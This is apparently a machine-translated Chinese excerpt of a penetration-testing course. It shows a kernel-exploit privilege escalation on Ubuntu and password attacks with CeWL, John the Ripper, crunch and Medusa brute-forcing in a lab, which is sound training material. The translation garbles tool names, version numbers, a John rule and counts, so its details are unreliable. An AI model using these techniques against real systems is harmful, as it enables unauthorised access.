
```
$ uname -r
4.8.0-generic
$ uname -m
x86_64
```

| 列表 588 - 从我们的 Linux 系统中收集内核和架构信息 |

我们的我们的目标系统似乎运行在 `x86_64` 架构上的 Ubuntu 16.04.3 LTS (`4.8.0-58-generic`)。利用这些信息，我们可以在本地的 Kali 系统上使用 `searchploit` 来寻找与目标匹配的内核漏洞。

```
$ searchploit kernel ubuntu 16.04
```

| 漏洞标题 | 路径 (`/usr/share/exploit/`) |

| :--- | :--- |

| Linux Kernel (Debian 7.7.8/5.9 / 0 / Ubuntu 14.04.2/16.04 / 14.04.5.2/17.0) | exploits/linux/x86_64/local/ |

| Linux Kernel (Ubuntu 16.04) - Reference Count Overflow | exploits/linux/x86_64/local/422 |

| Linux Kernel (Ubuntu 16.04) | exploits/linux/dos/39773.txt |

| Linux Kernel 4.4 (Ubuntu 16.04) - 'BPP' Local Privilege | exploits/linux/local/40759.r |

| Linux Kernel 4.4.0 (Ubuntu 16.04/16.04 x86-64) | exploits/linux_x86-64/local/ |

| Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter ta | exploits/linux/x86_64/local/ |

| Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput(1)' b | exploits/linux/local/39772.t |

| Linux Kernel 4.6.2-1) - PR__SO_SET_KERNEL | exploits/linux/local/40848.t |

| Linux Kernel < 4.4.0-83 < 4.8.0 (Ubuntu 16.04/16.04) | exploits/linux/local/43418.c |

| 列表 589 - 为我们的目标寻找权限提升漏洞 |

最后一个漏洞 (`exploits/linux/local/43418.c`) 似乎与我们目标的内核版本直接对应。我们需要在目标上运行该程序来提升我们的权限。

### 18.3.4.1 在 Linux 上编译 C/C++ 代码

我们将使用 `gcc` 来编译漏洞利用。请记住，在编译代码时，我们必须与目标架构匹配。在目标机器没有编译器，且我们被迫在攻击机器或复制了该操作系统和架构的沙箱环境中编译漏洞程序的情况下，这一点尤为重要。

在这个例子中，我们很幸运目标机器有一个可工作的编译器，但这在领域内是很罕见的。

让我们复制漏洞利用文件以进行编译，仅传递源代码并使用 `-o` 指定文件名（`exploit`）：

```
$ gcc 43418.c -o exploit
$ ls -lh exploit
```

> 5⁴ (GCC, 2019), https://gcc.gnu.org

PWK 20 | Copyright © Offensive Security Ltd. All rights reserved. | 569

## OFFENSIVE SECURITY

使用 Kali Linux 2.0 进行渗透测试

total 36K

-rwxr-xr-x 1 kali kali 28K Jan 27 04:04 exploit

列表 590 - 在我们的目标机器上编译漏洞利用程序，我们可以运行它并使用 `whoami` 检查我们的权限级别：

![](img/f99f528ca9845f4c256ce54e882b1345_569_0.png)

> 图 293：通过权限提升漏洞在 Linux 上提升权限

图 293 显示我们的权限已成功从 `nobody`（标准用户）提升到 `root`，这是 Linux 操作系统上的最高账户。

### 18.4 总结

在本模块中，我们涵盖了 Windows 和 Linux 操作系统以及不同架构上的权限提升概念。我们涵盖了手动和自动的枚举技术，这些技术揭示了此类攻击所需的信息。此外，我们演示了这两种操作的编译过程，演示了多次权限提升攻击，以及各种不需要软件漏洞的权限提升方式。

PWK 2.0                                                              © Offensive Security Ltd. All rights reserved.                                               570

## 19. 密码攻击

密码是用户账户和服务身份验证的最基本的形式，据此类，密码攻击的目标是发现并使用有效的凭据。

通常，密码攻击有两种方法。我们可以使用字典攻击或暴力破解。在某些情况下，我们可能会使用一个常用密码列表，或者使用工具来生成它们。

在本模块中，我们将讨论每种技术。

### 19.1 字典列表

字典列表（有时称为字典文件）是包含作为输入的简单文本文件。Kali 包含了许多预构建的字典列表，例如 `/usr/share/wordlists/` 中的。

我们可以通过添加特定目标的单词和短语来提高字典列表的有效性。例如，考虑 MegaCorp，一家经营纳米科技的公司。网站 `megacorp.com` 列出了产品，包括 `Nanobot`。在假设的评估中，我们识别出了低级密码 `Nanobot93`。假设这是我们公司的常见格式，我们想要创建一个识别其他密码的自定义字典列表。

我们可以浏览网站并将常用术语手动添加到字典列表中，或者使用像 `cwl` 这样的工具来完成这些工作。正如 `-help` 输出所示，该工具可以通过选择多个选项进行配置，我们将关注几个关键参数。

例如，以下命令提取 `megacorp.com`，列出至少六个字符的单词 (`-m 6`)，并将字典列表写入 (`-w`) 自文件 (`megacorp-cwl.txt`)。

```
kali@~$ cwl megacorp.com -m 6 -w megacorp-cwl.txt
kali@~$ wc -l megacorp-cwl.txt
```

```
kali@~$ grep Nano megacorp-cwl.txt
Nanotechnology
Nanonite
Nanrobe
Nanoprocessors
NanoTimes
Nanobot
```

> 列表 591 - 使用 cwl 创建字典文件

上面的列表显示 `cwl` 创建了几个产品的名称，包括 `Nanobot`。我们应该考虑其他产品名称也可能被用于密码的可能性。

然而，这些单词本身将是极其弱的密码，无法满足典型的密码策略规则。这类规则通常要求使用大小写字母、数字，可能还有特殊字符。根据我们发现的密码 (`Nanobot93`)，我们建议 `megacorp` 的密码策略要求密码中至少包含两个数字，并可能进一步规定（尽管这不太）数字必须位于密码末尾。

¹⁵⁴(DigNinja, 2017), http://www.digninja.org/projects/cwl.php

为了这个简单的演示，我们假设 Megacorp 的策略规定密码必须包含一个两位数字。

为了创建符合此要求的密码，我们可以编写一个 Bash 脚本。然而，我们将使用一个强大得多的工具，称为 John the Ripper (`JTR`)⁵。它是一个快速的密码破解器，具有生成自定义字典列表和规则变体的能力。

继续基于密码策略的假设，我们将在 JTR 配置文件 `/etc/john/john.conf` 中添加一条规则，以变变我们的字典列表，在每个密码末尾附加两个数字。为了做到，我们必须找到定义字典列表规则的 `[List.Rules:Wordlist]` 段，并添加一条新规则。例如，我们将在字典列表中的每个单词后附加从 0 到 99 的两位数字序列。

我们用 `$` 字符开始这条规则，它告诉 John 在字典列表中的原始单词后添加一个字符。接下来，我们指定想要添加的字符类型，在本例中，我们想要 `[0-9]` 之间的任何数字。最后，为了添加两个数字，我们只需重复 `$[0-9]`。最终的规则如列表 592 所示。

```
kali@kali:~$ sudo nano /etc/john/john.conf

# Wordlist mode rules
[List.Rules:Wordlist]
# 尝试原样的单词
# 将每个纯字母数字单词转换为小写
-c >? !X l Q
# 将每个纯字母数字单词转换为大写
-c (<?) !C Q
# 将纯字母单词转换为小写并变为复数

# 尝试分割密码的后半部分
-s x_
-s x_ M Q
# 在每个密码末尾两个数字
$[0-9]
```

列表 592 - 在 John the Ripper 配置文件创建变异规则

> John the Ripper 的语法非常广泛且强大，但超出了本模块的范围。欲了解更多信息，请花时间查看规则文档。

现在规则已添加到配置文件中，我们可以变异字典列表了，它目前包含 312 个条目。

# 使用 Kali Linux 2.0 进行渗透测试

为此，我们将调用 `john` 并指定字典文件 (`--wordlist=megacorp-cewl.txt`)，激活配置文件中的规则 (`--rules`)，将结果输出到标准输出 (`--stdout`)，并重定向到名为 `mutated.txt` 的文件。

```
kali@kali:$ john --wordlist=megacorp-cewl.txt --stdout > mutated
按 'q' 或 Ctrl-C 终止，按其他键查看状态
4644kp 0:00:00:00 100.00% (2018-03-01 15:41) 66354p/s chocolate99
```

```
kali@kali:$ grep Nanobot mutated.txt
...
Nanobot90
Nanobot91
Nanobot92
Nanobot93
Nanobot94
Nanobot95
Nanobot96
...
```

列表 593 - 使用 John the Ripper 变异密码

由于对密码进行了多次变异，生成的文件包含超过46000 个密码。其中一个密码是 'Nanobot93'它与我们在假设评估中发现的密码匹配。考虑到对 MegaCorp 密码策略的假设，此字典可以在字典攻击中产生结果。

尽管这个演示过于简化，但它是一个很好的示例，说明了密码分析如何对我们密码攻击的整体成功有利。

### 19.1.1.1 练习

（此练习不需要报告）

- 1. 使用 `cwl` 从你的公司或喜欢的网站生成自定义字典列表并检查结果。你的任何密码会出现吗？

### 19.2 暴力破解单词

与字典攻击相反，暴力破解会计算并测试可能组成密码的所有字符组合，直到找到正确的密码。虽然这听起来像是一个保证结果的简单方法，但它极其耗时。取决于密码的长度、复杂度以及测试系统的计算能力，破解一个密码可能需要很长时间，甚至数年。

我们可以结合这两个概念并创建暴力破解字典列表，即包含匹配特定模式的所有可能密码的字典文件。

例如，考虑一个揭示了特定密码执行策略的场景，如列表 594 所示：

```
kali@kali:$ cat dumped.pass.txt
david: Abc#123
mike: Jud(666)
Judy: Holi&278
```

![](img/f99f528ca9845f4c256ce54e882b1345_575_0.png)

列表 594 - 密码导出示例

查看这些密码，我们注意到密码结构中的以下模式：

[大写字母] [2 x 小写字母] [2 x 特殊字符] [3 x 数字]

列表 595 - 密码结构

有了这个，创建一个包含所有匹配此模式的密码的字典列表非常有帮助。Kali Linux 自带的 Crunch 是强大的字典列表生成器，可以处理此任务。

首先，我们必须描述我们需要 `crunch` 的模式，为此我们将代表特定类型字符的占位符：

| 占位符 | 类型 |

| :--- | :--- |

| @ | 字符集 |

| --- | 小写 |

| , | 大写 |

| % | 数字 |

| A | 特殊字符 |

规则模式和预定义的字符集，以便生成包含该用户密码的字典列表。

### 19.3 常见网络服务攻击方法

现在我们已经理解了如何为各种情况创建有效的字典列表，我们可以讨论如何使用它们来对常见网络服务进行密码攻击。

> 请记住，针对网络服务的密码攻击具有很高的噪声，在某些情况下是危险的。多次登录失败通常会在目标系统上生成日志和警告，并在达到预定义的失败登录尝试次数后锁定账户。这在渗透测试期间可能是灾难性的，导致用户在管理员重新启用账户之前无法访问生产系统。在盲目运行基于网络的暴力破解之前，请务必记住这一点。

一旦我们权衡了风险和目标网络的状况，就可以采取几个步骤来提高密码测试的效率。

取决于协议和密码破解工具，我们可以增加登录线程数来提高攻击速度。然而，在某些情况下（如 RDP 和 SMB），由于协议限制，可能无法增加线程数，我们的优化尝试可能会减慢进程。

此外，值得注意的是，RDP 等协议的身份验证协商过程比 HTTP 更耗时。然而，虽然攻击 RDP 协议可能比 HTTP 花费更多时间，但成功攻击 RDP 通常会带来更好的回报。网络服务攻击的秘密在于启动攻击之前，仔细且智能地选择合适的目标、用户和密码。

要成功攻击服务（如 HTTP、SSH、VNC、FTP、SNMP 和 POP3）的密码，我们不仅必须匹配目标用户名和密码，还要匹配验证过程中使用的协议。

幸运的是，像 THC-Hydra、Medusa、Crowbar 和 spray 等流行工具可以为我们处理这些请求。

在本节中，我们将检查这些每个工具以及它们有效的协议和业务处理能力。下文中提到的工具可能具有相似的能力和速度。使用“正确”工具通常取决于偏好的语法，而只有通过在测试环境中体验每种工具并学习它们的优缺点和独特性，才能确定输出输出。

# 使用 Kali Linux 2.0 进行渗透测试

### 19.3.1 使用 Medusa 进行 HTTP htaccess 攻击

根据作者的介绍，Medusa 旨在成为一个“快速、大规模并行、模块化的登录暴力破解工具”。

我们将使用 Medusa 进入受 htaccess 保护的 Web 目录。

首先，我们将设置目标，即 Windows 客户端上的 Apache Web 服务器，我们将通过 XAMPP 控制面板启动它。我们将尝试访问该服务器上受 htaccess 保护的文件夹 `/admin`。本例选择的字典是 `/usr/share/wordlists/rockyou.txt.gz`，我们必须先用 `gunzip` 对其解压。

```
kali@kali:~$ sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

列表 601 - 解压 rockyou 列表

接下来，我们将启动 Medusa 并对目标 `10.0.11.02` 上的受 htaccess 保护的 URL (`-h DIR/admin`) 发起攻击。我们将使用 `rockyou` 字典文件 (`-p /usr/share/wordlists/rockyou.txt`) 中的密码对用户 (`-u admin`) 进行攻击，而且我们当然会使用 HTTP 身份验证方案 (`-m`)：

```
kali@kali:~$ medusa -h 10.0.11.02 -u admin -p /usr/share/wordlists/rockyou.txt -m http -m DIR/admin
Medusa v2.2 (http://www.footfus.net) - JoMo-Kun / Foofus Networks jmk@footfus.net>
```

```
ACCOUNT CHECK: [http] Host: 10.0.11.02 User: admin Password: 123456 (1 of 14434391)
ACCOUNT CHECK: [http] Host: 10.0.11.02 User: admin Password: 12345 (2 of 14434391)
ACCOUNT CHECK: [http] Host: 10.0.11.02 User: admin Password: 1345678 (3 of 14434391)
ACCOUNT CHECK: [http] Host: 10.0.11.02 User: admin Password: password (4 of 14434391)
ACCOUNT CHECK: [http] Host: 10.0.11.02 User: admin Password: iloveyou (5 of 14434391)
```

```
ACCOUNT CHECK: [http] Host: 10.0.11.02 User: admin Password: samsung (255 of 14434391)
ACCOUNT CHECK: [http] Host: 10.0.11.02 User: admin Password: freedom (256 of 14434391)
ACCOUNT FOUND: [http] Host: 10.0.11.02 User: admin Password: freedom [SUCCESS]
```

列表 602 - 使用 Medusa 进行 HTTP htaccess 攻击

在这种情况下，Medusa 发现了密码 'freedom'。

Medusa 许多许多选项和设置，如列表 603 的输出所示：
